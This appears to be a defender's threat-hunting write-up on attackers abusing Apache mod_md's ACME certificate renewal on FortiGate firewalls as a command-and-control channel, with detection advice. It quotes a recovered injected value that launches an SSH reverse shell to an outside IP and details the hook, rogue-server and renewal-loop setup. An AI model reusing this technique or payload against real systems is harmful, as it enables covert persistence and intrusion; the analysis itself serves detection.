# H404

Think about what a certificate renewal is allowed to do.

It makes periodic outbound HTTPS requests to a third party you configured. It runs a local program as part of domain validation. It retries on failure. It survives restarts, because it lives in configuration. And every bit of that is normal, expected, sanctioned behaviour that no one investigates.

That is a C2 channel with the paperwork already filed.

The CL-STA-0954 operators noticed. Unit 42 reports they "established a command and control channel by weaponizing the native Apache mod_md (Managing Domains) module on FortiGate firewalls" — a module already present on the appliance, pointed at their own ACME server instead of a certificate authority.

Four pieces, each individually unremarkable.

**Registration.** The `account.json` state file showed registration with the attacker's ACME server, "explicitly routing ACME directory requests to external infrastructure." `order.json` mapped the authorization and finalization URLs to the same place.

**Execution.** `MDChallengeDns01` — the hook Apache runs to satisfy a DNS-01 challenge — "was mapped directly to /bin/node". So certificate validation now means: run Node.js with arguments supplied by the remote server.

**Tasking.** And this is the part worth sitting with. A DNS-01 challenge passes a *domain name* to the hook so it can publish a TXT record. The value comes from the ACME server. Whoever owns the ACME server owns the arguments. Unit 42 found in the `job.json` debug log that the attackers injected shell commands "directly into the domain name field of the challenge request" — the recovered value being `kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i`, which is not a domain name but SSH client arguments. The result was an SSH-based reverse shell.

**The loop.** `MDRenewMode always`, which Unit 42 says "forced the Apache daemon to continuously trigger these malicious renewal challenges" and so "ensured the continuous re-execution of the injected payload."

Certificates renew every few weeks. This one renewed forever.

Now, ACME is everywhere — Let's Encrypt, ZeroSSL, internal step-ca — and mod_md is a real Apache module doing a real job. So what actually separates this from a perfectly healthy web server?

Three things, in order of strength.

The challenge program. A DNS-01 hook is normally a purpose-built script that calls a DNS provider's API. `/bin/node` as the challenge command is not a hardened version of that; it has no benign form at all. This is the test to run first.

The directory URL. Legitimate renewal points at a known CA, or at an internal CA your organisation operates. An ACME endpoint on neither list is the finding — which means this hunt needs a list of the CAs you actually use, including the internal ones, or it will drown in its own false positives.

The cadence. Continuous challenge activity contradicts how certificate lifetimes work.

One ordering detail matters, because the operators anticipated the obvious check. Unit 42 reports they "Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file (#0 certs managed by ACME\n\n\n) to mask reverse-shell configuration files." The configuration file on a compromised appliance may read as perfectly boring.

The state files were not overwritten. Start there.

## Why

- **Every component is sanctioned behaviour.** Scheduled egress, a configurable remote endpoint, local program execution and automatic retry are all things a certificate client is supposed to do, so none of them is anomalous alone.
- **The challenge parameters come from the remote server.** That is the injection point: control the ACME endpoint and you control the arguments handed to an interpreter, with no further vulnerability needed.
- **A generic interpreter as the DNS-01 hook has no legitimate form.** Real hooks talk to DNS provider APIs, which makes `/bin/node` the single cleanest discriminator in this hunt.
- **`MDRenewMode always` contradicts how certificates work.** Renewal is driven by expiry windows measured in weeks, so continuous challenge activity is a configuration that only makes sense for an attacker.
- **It produces regular outbound traffic, unlike the other footholds from this intrusion.** Where PEERSTITCH opens no connections at all, this channel beacons — which makes egress telemetry useful here specifically.
- **The module was already installed.** Nothing was dropped and no binary was added, so file-based detection and software inventory have nothing to flag.
- **The configuration file was overwritten with a plausible placeholder.** The decoy is aimed at exactly the check a defender would run first, which is why the ACME state files are the more reliable source.
- **It arrived through the same traversal primitive as the implant.** One unsanitised configuration object name delivered three separate footholds, so finding one should prompt a search for the others.
